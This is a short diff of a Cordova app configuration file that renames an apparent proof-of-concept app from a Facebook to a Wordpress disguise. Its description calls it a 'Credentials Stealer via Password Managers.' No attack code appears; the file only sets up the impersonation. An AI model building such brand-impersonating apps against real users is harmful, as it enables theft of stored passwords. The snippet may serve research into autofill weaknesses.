@@ -1,7 +1,7 @@
 <?xml version='1.0' encoding='utf-8'?>
-<widget id="com.facebook.vuln" version="0.0.1" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
-    <name>Facebook</name>
-    <description>Facebook Credentials Stealer via Password Managers.</description>
+<widget id="org.wordpress.vuln" version="0.0.1" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
+    <name>Wordpress</name>
+    <description>Wordpress Blog Credentials Stealer via Password Managers.</description>
     <author email="" href="https://www.github.com/team-shell.com/">team-shell</author>
     <content src="index.html" />
     <access origin="*" />
